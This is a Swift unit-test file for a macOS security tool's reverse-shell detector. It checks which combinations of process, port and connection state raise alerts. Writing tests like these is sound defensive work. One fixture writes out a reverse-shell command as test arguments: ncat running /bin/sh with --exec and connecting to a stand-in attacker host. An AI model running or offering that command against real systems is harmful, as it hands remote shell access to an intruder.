// MARK: - Nick
// Copyright © 2026 Ehsan Azish — github.com/EhsanAzish80
// Licensed under AGPL-3.0. See LICENSE for details.

import XCTest
@testable import Nick

// MARK: - ReverseShellDetectorTests

final class ReverseShellDetectorTests: XCTestCase {

    // MARK: - Helpers

    private func makeProc(
        pid: Int32 = 100,
        name: String,
        path: String = "/bin/bash",
        parentName: String = "",
        signingStatus: SigningStatus = .unsigned,
        arguments: [String] = []
    ) -> NickProcessInfo {
        NickProcessInfo(
            pid: pid, path: path, name: name,
            parentPID: 1, parentName: parentName,
            signingStatus: signingStatus, metadata: ProcessMetadata(user: "user", startTime: Date(), arguments: arguments)
        )
    }

    private func makeConn(
        pid: Int32,
        remoteAddress: String = "1.2.3.4",
        remotePort: Int = 4444,
        state: ConnectionState = .established,
        proto: ConnectionProtocol = .tcp
    ) -> NetworkConnectionInfo {
        NetworkConnectionInfo(
            id: UUID(), pid: pid, processName: "test",
            transportProtocol: proto,
            localAddress: "192.168.1.1", localPort: 54321,
            remoteAddress: remoteAddress, remotePort: remotePort,
            state: state
        )
    }

    // MARK: - Shell → unusual port

    func test_signals_bashWithNonStandardPort_returnsHighSignal() {
        let proc = makeProc(pid: 100, name: "bash")
        let conn = makeConn(pid: 100, remotePort: 4444)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertFalse(signals.isEmpty)
        XCTAssertEqual(signals.first?.severity, .high)
        XCTAssertEqual(signals.first?.metadata["reason"], "reverse_shell")
    }

    func test_signals_zshFromTerminalWithUnusualPort_returnsEmpty() {
        let proc = makeProc(pid: 101, name: "zsh", parentName: "Terminal")
        let conn = makeConn(pid: 101, remotePort: 1337)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    func test_signals_signedPythonFromTerminalWithUnusualPort_returnsEmpty() {
        let proc = makeProc(pid: 102, name: "python3", path: "/usr/bin/python3", parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"))
        let conn = makeConn(pid: 102, remotePort: 9001)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    // MARK: - Shell → safe port (no signal)

    func test_signals_bashToPort443_returnsEmpty() {
        let proc = makeProc(pid: 200, name: "bash")
        let conn = makeConn(pid: 200, remotePort: 443)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    func test_signals_bashToPort22_returnsEmpty() {
        let proc = makeProc(pid: 201, name: "bash")
        let conn = makeConn(pid: 201, remotePort: 22)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    func test_signals_bashToPort80_returnsEmpty() {
        let proc = makeProc(pid: 202, name: "bash")
        let conn = makeConn(pid: 202, remotePort: 80)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    // MARK: - TCP state — only ESTABLISHED flagged

    func test_signals_bashListeningSocket_returnsEmpty() {
        let proc = makeProc(pid: 300, name: "bash")
        let conn = makeConn(pid: 300, remotePort: 4444, state: .listen)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    func test_signals_bashClosedSocket_returnsEmpty() {
        let proc = makeProc(pid: 301, name: "bash")
        let conn = makeConn(pid: 301, remotePort: 4444, state: .closed)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    // MARK: - UDP connections not flagged

    func test_signals_udpConnection_returnsEmpty() {
        let proc = makeProc(pid: 400, name: "bash")
        let conn = makeConn(pid: 400, remotePort: 4444, proto: .udp)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    // MARK: - Temp path binary

    func test_signals_tempPathBinaryWithOutbound_returnsHighSignal() {
        let proc = makeProc(pid: 500, name: "evil", path: "/tmp/evil_binary")
        let conn = makeConn(pid: 500, remotePort: 5555)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertFalse(signals.isEmpty)
        XCTAssertEqual(signals.first?.metadata["reason"], "temp_binary_network")
    }

    func test_signals_varFoldersBinaryWithOutbound_returnsHighSignal() {
        let proc = makeProc(pid: 501, name: "suspicion", path: "/var/folders/xx/yyy/T/suspicion")
        let conn = makeConn(pid: 501, remotePort: 6666)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertFalse(signals.isEmpty)
    }

    // MARK: - netcat context

    func test_signals_ncHealthCheckFromTerminal_returnsEmpty() {
        let proc = makeProc(
            pid: 600, name: "nc", path: "/usr/bin/nc",
            parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"),
            arguments: ["nc", "-z", "example.com", "443"]
        )
        let conn = makeConn(pid: 600, remotePort: 443)
        XCTAssertTrue(ReverseShellDetector.signals(from: [proc], connections: [conn]).isEmpty)
    }

    func test_signals_ncatExecMode_returnsHighSignal() {
        let proc = makeProc(
            pid: 601, name: "ncat", path: "/usr/bin/ncat",
            parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"),
            arguments: ["ncat", "--exec", "/bin/sh", "attacker.example", "9999"]
        )
        let conn = makeConn(pid: 601, remotePort: 9999)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.contains { $0.metadata["reason"] == "reverse_shell" })
    }

    // MARK: - Trusted process list — reverse shell signals are NOT suppressed

    func test_signals_trustedProcessNotSuppressed_returnsSignal() {
        // python3 is in builtIn trusted list, but reverse shell signals are orthogonal
        // to the unsigned-binary trusted list; network behaviour still fires.
        let proc = makeProc(pid: 700, name: "bash")
        let conn = makeConn(pid: 700, remotePort: 4444)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertFalse(signals.isEmpty)
    }

    // MARK: - Unknown PID — no signal

    func test_signals_unknownPidInConnection_returnsEmpty() {
        let proc = makeProc(pid: 800, name: "bash")
        let conn = makeConn(pid: 999, remotePort: 4444) // different PID
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertTrue(signals.isEmpty)
    }

    // MARK: - evaluate(process:connection:) API

    func test_evaluate_shellUnusualPort_returnsSignal() {
        let proc = makeProc(pid: 900, name: "zsh")
        let conn = makeConn(pid: 900, remotePort: 8888)
        let signal = ReverseShellDetector.evaluate(process: proc, connection: conn)
        XCTAssertNotNil(signal)
        XCTAssertEqual(signal?.severity, .high)
    }

    func test_evaluate_nonShellProcess_returnsNil() {
        let proc = makeProc(pid: 901, name: "Xcode", path: "/Applications/Xcode.app")
        let conn = makeConn(pid: 901, remotePort: 8888)
        let signal = ReverseShellDetector.evaluate(process: proc, connection: conn)
        XCTAssertNil(signal)
    }

    // MARK: - Metadata

    func test_signals_metadata_containsDetectorName() {
        let proc = makeProc(pid: 1000, name: "bash")
        let conn = makeConn(pid: 1000, remotePort: 7777)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertEqual(signals.first?.metadata["detector"], "ReverseShellDetector")
    }

    func test_signals_metadata_containsRemoteEndpoint() {
        let proc = makeProc(pid: 1001, name: "bash")
        let conn = makeConn(pid: 1001, remoteAddress: "10.0.0.1", remotePort: 4445)
        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
        XCTAssertEqual(signals.first?.metadata["remote"], "10.0.0.1:4445")
    }
}
